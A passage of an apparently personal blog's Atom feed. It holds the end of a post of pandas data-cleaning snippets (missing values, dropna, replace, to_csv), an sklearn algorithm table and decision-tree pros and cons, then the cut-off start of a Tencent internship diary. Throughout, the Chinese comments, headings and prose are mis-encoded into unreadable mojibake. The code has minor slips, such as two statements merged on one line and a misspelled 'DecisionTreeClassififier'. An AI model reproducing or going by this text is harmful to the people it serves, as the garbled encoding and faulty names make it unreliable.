class="number">0</span>]=np.nan <span class="comment">#å…ˆæ–°å»ºä¸€åˆ—</span></span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;è½¯ä»¶å›­ä¸€æœŸ&#x27;</span> <span class="comment"># ç¬¬ä¸€æ¬¡è¦iloc</span></span><br><span class="line">q3_df.loc[<span class="number">1</span>] = <span class="string">&#x27;è½¯ä»¶å›­äºŒæœŸ&#x27;</span>   <span class="comment"># åé¢å¯ä»¥ç”¨ilocæ¥åš</span></span><br><span class="line">q3_df.loc[<span class="number">2</span>] = <span class="string">&#x27;è½¯ä»¶å›­ä¸‰æœŸ&#x27;</span></span><br><span class="line">q3_df.loc[<span class="number">3</span>] = <span class="string">&#x27;åŒ»è¯åˆ¶é€ &#x27;</span>q3_df.iloc[<span class="number">0</span>,<span class="number">1</span>] = bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">2</span>] = sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">3</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>])/sz_factory[<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">4</span>] = nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">q3_df.iloc[<span class="number">0</span>,<span class="number">5</span>] = (bz_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]-nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>])/nl_factory.iloc[<span class="number">1</span>,<span class="number">1</span>]</span><br><span class="line"><span class="comment"># æ–°å»ºdf æ–¹æ³•äºŒç›´æ¥concat</span></span><br><span class="line">q1_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line">tmp_df.loc[<span class="number">0</span>]=np.nan</span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;å·¥ä¸š&#x27;</span></span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">0</span>] = <span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span></span><br><span class="line"></span><br><span class="line">q1_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_gy[<span class="string">&#x27;å¼€å·¥æŒ‡æ•°&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line">tmp_df.iloc[<span class="number">0</span>,<span class="number">1</span>]=bz_jz[<span class="string">&#x27;å¼€å·¥æŒ‡æ•°&#x27;</span>].<span class="built_in">round</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">q1_df = pd.concat([q1_df,tmp_df],axis=<span class="number">0</span>)</span><br><span class="line">q1_df.to_csv(<span class="string">&#x27;Q2-1.csv&#x27;</span>,index=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ä¸€åˆ—æ·»åŠ åˆ°ä¸€ä¸ªæ–°çš„dfé‡Œé¢ï¼Œéœ€è¦ä¿è¯ï¼ï¼ï¼indexä¸€è‡´ï¼ï¼ï¼ å¦åˆ™åŠ ä¸è¿›å»</span></span><br><span class="line"><span class="comment"># q2_df</span></span><br><span class="line">cols_q2 = [<span class="string">&#x27;ç±»åˆ«&#x27;</span>,<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ç¯æ¯”æå‡&#x27;</span>,<span class="string">&#x27;å†œå†åŒæœŸå‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;åŒæ¯”æå‡&#x27;</span>]</span><br><span class="line">q2_df = pd.DataFrame(columns=cols_q2)</span><br><span class="line">q2_df[<span class="string">&#x27;ç±»åˆ«&#x27;</span>]=usage_bz.T.index</span><br><span class="line">q2_df[<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>]=usage_bz.T.reset_index()[<span class="string">&#x27;å¦é—¨å¸‚&#x27;</span>] <span class="comment">#è¦å…ˆreset_index</span></span><br><span class="line">q2_df</span><br></pre></td></tr></table></figure><h3><span id="æ›´æ”¹æ—¥æœŸé—´éš”">æ›´æ”¹æ—¥æœŸé—´éš”</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ”¹æ—¥æœŸé—´éš”</span></span><br><span class="line">plt.xticks(pd.date_range(<span class="string">&#x27;2021-01-01&#x27;</span>,<span class="string">&#x27;2021-03-31&#x27;</span>,freq=<span class="string">&#x27;20D&#x27;</span>))</span><br></pre></td></tr></table></figure><h3><span id="æŸ¥çœ‹ç»Ÿè®¡æ•°æ®">æŸ¥çœ‹ç»Ÿè®¡æ•°æ®</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®è¡Œåˆ—æ•°</span></span><br><span class="line">df.shape</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®é‡</span></span><br><span class="line">df.size</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ æ•°å€¼å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€å‡å€¼ä»€ä¹ˆçš„</span></span><br><span class="line">df.describe()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ ç¦»æ•£å‹ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œè®¡æ•°ã€é¢‘ç‡ä»€ä¹ˆ</span></span><br><span class="line">df.describe(include=[<span class="string">&#x27;O&#x27;</span>])</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ å…¨éƒ¨ åˆ—çš„ç»Ÿè®¡ä¿¡æ¯</span></span><br><span class="line">df.describe(include=<span class="string">&#x27;all&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="ä¿å­˜æ–‡ä»¶">ä¿å­˜æ–‡ä»¶</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸ä¿å­˜ç´¢å¼•</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,index = <span class="literal">False</span>)</span><br><span class="line"><span class="comment"># ä¿å­˜æŒ‡å®šåˆ—</span></span><br><span class="line">data.to_csv(<span class="string">&quot;out.csv&quot;</span>,encoding = <span class="string">&#x27;utf_8_sig&#x27;</span>,columns=[<span class="string">&#x27;positionName&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>])</span><br><span class="line"><span class="comment"># å°æ•°ç‚¹</span></span><br><span class="line">mar.to_csv(<span class="string">&quot;2-1.csv&quot;</span>, index=<span class="literal">False</span>, float_format=<span class="string">&#x27;%.3f&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®é¢„å¤„ç†">æ•°æ®é¢„å¤„ç†</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># isnull() is an alias for isna </span></span><br><span class="line"><span class="comment"># è®¡ç®—ç¼ºå¤±å€¼</span></span><br><span class="line">df.isna().<span class="built_in">sum</span>().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æ¯åˆ—æœ‰å¤šå°‘ç¼ºå¤±å€¼</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç¼ºå¤±å€¼</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨æ•´åˆ—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].mean())</span><br><span class="line"><span class="comment"># ç°åœ¨å°†è¯„åˆ†åˆ—çš„ç¼ºå¤±å€¼ï¼Œæ›¿æ¢ä¸ºä¸Šä¸€ä¸ªç”µå½±çš„è¯„åˆ†</span></span><br><span class="line">df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>] = df[<span class="string">&#x27;è¯„åˆ†&#x27;</span>].fillna(axis=<span class="number">0</span>,method=<span class="string">&#x27;ffill&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†è¯„ä»·äººæ•°åˆ—çš„ç¼ºå¤±å€¼ï¼Œç”¨ä¸Šä¸‹æ•°å­—çš„å‡å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>] = df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].fillna(df[<span class="string">&#x27;è¯„ä»·äººæ•°&#x27;</span>].interpolate())</span><br><span class="line"><span class="comment"># åœ¨å¡«å…… â€œè¯­è¨€â€ åˆ—çš„ç¼ºå¤±å€¼ï¼Œè¦æ±‚æ ¹æ® â€œå›½å®¶/åœ°åŒºâ€ åˆ—çš„å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;è¯­è¨€&#x27;</span>]=df.groupby(<span class="string">&#x27;å›½å®¶/åœ°åŒº&#x27;</span>).è¯­è¨€.bfill()</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"><span class="comment"># æŸ¥æ‰¾æŒ‡å®šåˆ—çš„é‡å¤å€¼</span></span><br><span class="line">df[df.duplicated([<span class="string">&#x27;ç‰‡å&#x27;</span>])]</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼</span></span><br><span class="line">df = df.drop_duplicates()</span><br><span class="line"><span class="comment"># åˆ é™¤å…¨éƒ¨çš„é‡å¤å€¼ï¼Œä½†ä¿ç•™æœ€åä¸€æ¬¡å‡ºç°çš„å€¼first/last/false</span></span><br><span class="line">df = df.drop_duplicates(keep = <span class="string">&#x27;last&#x27;</span>)</span><br><span class="line"><span class="comment"># è®¡ç®—å„çœå¸‚å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line">df.çœå¸‚.value_counts()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># éƒ½å¯ä»¥ç”¨inplace=Trueæ¥ä»£æ›¿èµ‹å€¼</span></span><br></pre></td></tr></table></figure><h3><span id="åˆ é™¤ç©ºè¡Œ">åˆ é™¤ç©ºè¡Œ</span></h3><p><strong>1.å‡½æ•°è¯¦è§£</strong></p><p>å‡½æ•°å½¢å¼ï¼šdropna(axis&#x3D;0, how&#x3D;â€™anyâ€™, thresh&#x3D;None, subset&#x3D;None, inplace&#x3D;False)</p><p>å‚æ•°ï¼š</p><p><strong>axis</strong>ï¼šè½´ã€‚0æˆ–â€™indexâ€™ï¼Œè¡¨ç¤ºæŒ‰è¡Œåˆ é™¤ï¼›1æˆ–â€™columnsâ€™ï¼Œè¡¨ç¤ºæŒ‰åˆ—åˆ é™¤ã€‚</p><p><strong>how</strong>ï¼šç­›é€‰æ–¹å¼ã€‚â€˜anyâ€™ï¼Œè¡¨ç¤ºè¯¥è¡Œ&#x2F;åˆ—åªè¦æœ‰ä¸€ä¸ªä»¥ä¸Šçš„ç©ºå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ï¼›â€˜allâ€™ï¼Œè¡¨ç¤ºè¯¥è¡Œ&#x2F;åˆ—å…¨éƒ¨éƒ½ä¸ºç©ºå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ã€‚</p><p><strong>thresh</strong>ï¼šéç©ºå…ƒç´ æœ€ä½æ•°é‡ã€‚intå‹ï¼Œé»˜è®¤ä¸ºNoneã€‚å¦‚æœè¯¥è¡Œ&#x2F;åˆ—ä¸­ï¼Œéç©ºå…ƒç´ æ•°é‡å°äºè¿™ä¸ªå€¼ï¼Œå°±åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—ã€‚</p><p><strong>subset</strong>ï¼šå­é›†ã€‚åˆ—è¡¨ï¼Œå…ƒç´ ä¸ºè¡Œæˆ–è€…åˆ—çš„ç´¢å¼•ã€‚å¦‚æœaxis&#x3D;0æˆ–è€…â€˜indexâ€™ï¼Œsubsetä¸­å…ƒç´ ä¸ºåˆ—çš„ç´¢å¼•ï¼›å¦‚æœaxis&#x3D;1æˆ–è€…â€˜columnâ€™ï¼Œsubsetä¸­å…ƒç´ ä¸ºè¡Œçš„ç´¢å¼•ã€‚ç”±subseté™åˆ¶çš„å­åŒºåŸŸï¼Œæ˜¯åˆ¤æ–­æ˜¯å¦åˆ é™¤è¯¥è¡Œ&#x2F;åˆ—çš„æ¡ä»¶åˆ¤æ–­åŒºåŸŸã€‚</p><p><strong>inplace</strong>ï¼šæ˜¯å¦åŸåœ°æ›¿æ¢ã€‚å¸ƒå°”å€¼ï¼Œé»˜è®¤ä¸ºFalseã€‚å¦‚æœä¸ºTrueï¼Œåˆ™åœ¨åŸDataFrameä¸Šè¿›è¡Œæ“ä½œï¼Œè¿”å›å€¼ä¸ºNoneã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ é™¤æ•´è¡Œç¼ºå¤±çš„æ•°æ®ï¼Œå‰©ä½™ç¼ºå¤±æ•°æ®æŒ‰0å€¼è¿›è¡Œå¡«å……</span></span><br><span class="line">df2 = df2.dropna(how=<span class="string">&#x27;all&#x27;</span>).fillna(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤æŸåˆ—ä¸ºç©ºçš„è¡Œ</span></span><br><span class="line">df_initial.dropna(axis = <span class="number">0</span>, subset = [<span class="string">&#x27;å®¢æˆ·ID&#x27;</span>], inplace = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="æ›¿æ¢">æ›¿æ¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†é‡‘ç‰Œæ•°åˆ—çš„æ•°å­— 0 æ›¿æ¢ä¸º æ— </span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].replace(<span class="number">0</span>,<span class="string">&#x27;æ— &#x27;</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#åŒæ—¶æ›¿æ¢ 1å°† æ—  æ›¿æ¢ä¸º ç¼ºå¤±å€¼ 2å°† 0 æ›¿æ¢ä¸º None</span></span><br><span class="line">df.replace([<span class="string">&#x27;æ— &#x27;</span>,<span class="number">0</span>],[np.nan,<span class="string">&#x27;None&#x27;</span>],inplace = <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># å°† `é‡‘ç‰Œæ•°` åˆ—ç±»å‹ä¿®æ”¹ä¸º `int`</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] = df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>].fillna(<span class="string">&#x27;0&#x27;</span>).astype(<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure><h2><span id="ç®—æ³•æ€»ç»“">ç®—æ³•æ€»ç»“</span></h2><table><thead><tr><th>åˆ†ç±»</th><th>å›å½’</th></tr></thead><tbody><tr><td>åˆ†ç±»æ ‘<strong>tree.DecisionTreeClassififier</strong></td><td>å›å½’æ ‘<strong>tree.DecisionTreeRegressor</strong></td></tr><tr><td>éšæœºæ£®æ—<strong>ensemble.RandomForestClassifier</strong></td><td>å›å½’æ£®æ—<strong>ensemble.RandomForestRegressor</strong></td></tr><tr><td>é€»è¾‘å›å½’<strong>linear_model.LogisticRegression</strong></td><td></td></tr><tr><td>KNN <strong>neighbors .KNeighborsClassifier</strong></td><td></td></tr><tr><td>Naive Bayes</td><td></td></tr><tr><td>æ¢¯åº¦æå‡æ ‘æœ¨<strong>ensemble.GradientBoostingRegressor</strong></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h3><span id="å†³ç­–æ ‘">å†³ç­–æ ‘</span></h3><p><strong>å†³ç­–æ ‘ä¼˜ç‚¹</strong></p><ol><li><p>æ˜“äºç†è§£å’Œè§£é‡Šï¼Œå› ä¸ºæ ‘æœ¨å¯ä»¥ç”»å‡ºæ¥è¢«çœ‹è§</p></li><li><p>éœ€è¦å¾ˆå°‘çš„æ•°æ®å‡†å¤‡ã€‚å…¶ä»–å¾ˆå¤šç®—æ³•é€šå¸¸éƒ½éœ€è¦æ•°æ®è§„èŒƒåŒ–ï¼Œéœ€è¦åˆ›å»ºè™šæ‹Ÿå˜é‡å¹¶åˆ é™¤ç©ºå€¼ç­‰ã€‚ä½†è¯·æ³¨æ„ï¼Œsklearnä¸­çš„å†³ç­–æ ‘æ¨¡å—ä¸æ”¯æŒå¯¹ç¼ºå¤±å€¼çš„å¤„ç†ã€‚</p></li><li><p>ä½¿ç”¨æ ‘çš„æˆæœ¬ï¼ˆæ¯”å¦‚è¯´ï¼Œåœ¨é¢„æµ‹æ•°æ®çš„æ—¶å€™ï¼‰æ˜¯ç”¨äºè®­ç»ƒæ ‘çš„æ•°æ®ç‚¹çš„æ•°é‡çš„å¯¹æ•°ï¼Œç›¸æ¯”äºå…¶ä»–ç®—æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆä½çš„æˆæœ¬ã€‚</p></li><li><p>èƒ½å¤ŸåŒæ—¶å¤„ç†æ•°å­—å’Œåˆ†ç±»æ•°æ®ï¼Œæ—¢å¯ä»¥åšå›å½’åˆå¯ä»¥åšåˆ†ç±»ã€‚å…¶ä»–æŠ€æœ¯é€šå¸¸ä¸“é—¨ç”¨äºåˆ†æä»…å…·æœ‰ä¸€ç§å˜é‡ç±»å‹çš„æ•°æ®é›†ã€‚</p></li><li><p>èƒ½å¤Ÿå¤„ç†å¤šè¾“å‡ºé—®é¢˜ï¼Œå³å«æœ‰å¤šä¸ªæ ‡ç­¾çš„é—®é¢˜ï¼Œæ³¨æ„ä¸ä¸€ä¸ªæ ‡ç­¾ä¸­å«æœ‰å¤šç§æ ‡ç­¾åˆ†ç±»çš„é—®é¢˜åŒºåˆ«å¼€</p></li><li><p>æ˜¯ä¸€ä¸ªç™½ç›’æ¨¡å‹ï¼Œç»“æœå¾ˆå®¹æ˜“èƒ½å¤Ÿè¢«è§£é‡Šã€‚å¦‚æœåœ¨æ¨¡å‹ä¸­å¯ä»¥è§‚å¯Ÿåˆ°ç»™å®šçš„æƒ…å†µï¼Œåˆ™å¯ä»¥é€šè¿‡å¸ƒå°”é€»è¾‘è½»æ¾è§£é‡Šæ¡ä»¶ã€‚ç›¸åï¼Œåœ¨é»‘ç›’æ¨¡å‹ä¸­ï¼ˆä¾‹å¦‚ï¼Œåœ¨äººå·¥ç¥ç»ç½‘ç»œä¸­ï¼‰ï¼Œç»“æœå¯èƒ½æ›´éš¾ä»¥è§£é‡Šã€‚</p></li><li><p>å¯ä»¥ä½¿ç”¨ç»Ÿè®¡æµ‹è¯•éªŒè¯æ¨¡å‹ï¼Œè¿™è®©æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ¨¡å‹çš„å¯é æ€§ã€‚</p></li><li><p>å³ä½¿å…¶å‡è®¾åœ¨æŸç§ç¨‹åº¦ä¸Šè¿åäº†ç”Ÿæˆæ•°æ®çš„çœŸå®æ¨¡å‹ï¼Œä¹Ÿèƒ½å¤Ÿè¡¨ç°è‰¯å¥½ã€‚</p></li></ol><p><strong>å†³ç­–æ ‘çš„ç¼ºç‚¹</strong></p><ol><li><p>å†³ç­–æ ‘å­¦ä¹ è€…å¯èƒ½åˆ›å»ºè¿‡äºå¤æ‚çš„æ ‘ï¼Œè¿™äº›æ ‘ä¸èƒ½å¾ˆå¥½åœ°æ¨å¹¿æ•°æ®ã€‚è¿™ç§°ä¸ºè¿‡åº¦æ‹Ÿåˆã€‚ä¿®å‰ªï¼Œè®¾ç½®å¶èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ ·æœ¬æ•°æˆ–è®¾ç½®æ ‘çš„æœ€å¤§æ·±åº¦ç­‰æœºåˆ¶æ˜¯é¿å…æ­¤é—®é¢˜æ‰€å¿…éœ€çš„ï¼Œè€Œè¿™äº›å‚æ•°çš„æ•´åˆå’Œè°ƒæ•´å¯¹åˆå­¦è€…æ¥è¯´ä¼šæ¯”è¾ƒæ™¦æ¶©</p></li><li><p>å†³ç­–æ ‘å¯èƒ½ä¸ç¨³å®šï¼Œæ•°æ®ä¸­å¾®å°çš„å˜åŒ–å¯èƒ½å¯¼è‡´ç”Ÿæˆå®Œå…¨ä¸åŒçš„æ ‘ï¼Œè¿™ä¸ªé—®é¢˜éœ€è¦é€šè¿‡é›†æˆç®—æ³•æ¥è§£å†³ã€‚</p></li><li><p>å†³ç­–æ ‘çš„å­¦ä¹ æ˜¯åŸºäºè´ªå©ªç®—æ³•ï¼Œå®ƒé ä¼˜åŒ–å±€éƒ¨æœ€ä¼˜ï¼ˆæ¯ä¸ªèŠ‚ç‚¹çš„æœ€ä¼˜ï¼‰æ¥è¯•å›¾è¾¾åˆ°æ•´ä½“çš„æœ€ä¼˜ï¼Œä½†è¿™ç§åšæ³•ä¸èƒ½ä¿è¯è¿”å›å…¨å±€æœ€ä¼˜å†³ç­–æ ‘ã€‚è¿™ä¸ªé—®é¢˜ä¹Ÿå¯ä»¥ç”±é›†æˆç®—æ³•æ¥è§£å†³ï¼Œåœ¨éšæœºæ£®æ—ä¸­ï¼Œç‰¹å¾å’Œæ ·æœ¬ä¼šåœ¨åˆ†æè¿‡ç¨‹ä¸­è¢«éšæœºé‡‡æ ·ã€‚</p></li><li><p>æœ‰äº›æ¦‚å¿µå¾ˆéš¾å­¦ä¹ ï¼Œå› ä¸ºå†³ç­–æ ‘ä¸å®¹æ˜“è¡¨è¾¾å®ƒä»¬ï¼Œä¾‹å¦‚XORï¼Œå¥‡å¶æ ¡éªŒæˆ–å¤šè·¯å¤ç”¨å™¨é—®é¢˜ã€‚</p></li><li><p>å¦‚æœæ ‡ç­¾ä¸­çš„æŸäº›ç±»å ä¸»å¯¼åœ°ä½ï¼Œå†³ç­–æ ‘å­¦ä¹ è€…ä¼šåˆ›å»ºåå‘ä¸»å¯¼ç±»çš„æ ‘ã€‚å› æ­¤ï¼Œå»ºè®®åœ¨æ‹Ÿåˆå†³ç­–æ ‘ä¹‹å‰å¹³è¡¡æ•°æ®é›†ã€‚</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="æœºå™¨å­¦ä¹ " scheme="https://disda-coding.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="æœºå™¨å­¦ä¹  å¤§æ•°æ® pandas" scheme="https://disda-coding.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%A4%A7%E6%95%B0%E6%8D%AE-pandas/"/>
    
  </entry>
  
  <entry>
    <title>é¹…åœºçš„æ—¥è®°</title>
    <link href="https://disda-coding.github.io/2020/05/28/Tencent-intern-LOG/"/>
    <id>https://disda-coding.github.io/2020/05/28/Tencent-intern-LOG/</id>
    <published>2020-05-28T15:14:13.000Z</published>
    <updated>2023-03-31T08:13:14.291Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç¬”è€…ä¹‹å‰ä½¿ç”¨çš„Javaå±…å¤šï¼Œè¿›å…¥è…¾è®¯å®ä¹ å¾—è½¬C++ï¼Œå› æ­¤ç›¸å¯¹C++å·¥ç¨‹å¸ˆæ¥è¯´åŸºç¡€ä¸º0ã€‚æƒ³é€šè¿‡æ—¥è®°çš„æ–¹å¼è®°å½•è‡ªå·±çš„æˆé•¿å’Œç”Ÿæ´»çš„ä¸€äº›çäº‹ï¼Œäº‰å–è½¬æ­£ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#2020520">2020&#x2F;5&#x2F;20</a></li><li><a href="#2020521">2020&#x2F;5&#x2F;21</a></li><li><a href="#2020522">2020&#x2F;5&#x2F;22</a></li><li><a href="#2020525">2020&#x2F;5&#x2F;25</a></li><li><a href="#2020526">2020&#x2F;5&#x2F;26</a></li><li><a href="#examples">Examples</a></li><li><a href="#2020527">2020&#x2F;5&#x2F;27</a></li><li><a href="#2020528">2020&#x2F;5&#x2F;28</a></li><li><a href="#2020529">2020&#x2F;5&#x2F;29</a></li><li><a href="#202061">2020&#x2F;6&#x2F;1</a></li><li><a href="#202062">2020&#x2F;6&#x2F;2</a></li><li><a href="#202063">2020&#x2F;6&#x2F;3</a></li><li><a href="#202064">2020&#x2F;6&#x2F;4</a></li><li><a href="#202065">2020&#x2F;6&#x2F;5</a></li><li><a href="#202068">2020&#x2F;6&#x2F;8</a></li><li><a href="#202069">2020&#x2F;6&#x2F;9</a></li><li><a href="#2020610">2020&#x2F;6&#x2F;10</a></li><li><a href="#2020611">2020&#x2F;6&#x2F;11</a></li></ul><!-- tocstop --><h2><span id="2020x2f5x2f20">2020&#x2F;5&#x2F;20</span></h2><p>â€‹åˆšåˆ°æ·±åœ³å°±ä¸‹é›¨äº†ï¼Œè·¯ä¸Šå¾ˆå¤šé»‘è½¦å¸æœºæ¼«å¤©è¦ä»·åˆ°é…’åº—è¦90ã€100ã€‚æˆ‘çœ‹äº†ä¸€çœ¼æ»´æ»´æ‰éœ€è¦50.æœæ–­é€‰æ‹©æ‰“æ»´æ»´ï¼Œä½†æ˜¯åé¢ä¸€ä¸ªé»‘è½¦è€æ¿é”²è€Œä¸èˆæŠ¥äº†ä¸ª60ï¼Œç„¶åæˆ‘æ„Ÿè§‰å·®ä¸å¤šå°±ç­”åº”äº†ï¼Œæ²¡æƒ³åˆ°ä¸€ä¸Šè½¦å°±ä¸‹é›¨äº†ï¼Œä¹Ÿæ˜¯è¿æ°”å¾ˆå¥½ã€‚è™½ç„¶è·¯ä¸Šè¿˜æäº†ä¸¤ä¸ªäººä½†æ˜¯å…ˆé€æˆ‘åˆ°é…’åº—ï¼Œä¸è¿‡é»‘è½¦ä¹Ÿæ²¡é€åˆ°é…’åº—é—¨å£ã€‚åˆ°é…’åº—åèµ°å®Œæµç¨‹ï¼Œå®Œæˆçº¿ä¸Šçš„ç­¾çº¦å°±é™ç­‰è…¾è®¯é‚£è¾¹æµç¨‹ï¼Œæ™šäº›æ—¶å€™æ‰“äº†ä¸€ä¼šæ— é™ç«åŠ›ã€‚</p><h2><span id="2020x2f5x2f21">2020&#x2F;5&#x2F;21</span></h2><p>â€‹hråŠ©æ‰‹ä¸Šæ˜¾ç¤ºé€šè¡Œç æ˜å¤©æ‰ä¼šç»¿ï¼Œä»Šå¤©å»ä¸äº†å…¬å¸äº†ã€‚æœæ–­å»Bç«™æŠŠå°ç¨‹åºå‰©ä¸‹çš„å†…å®¹å­¦ä¹ å®Œã€‚</p><h2><span 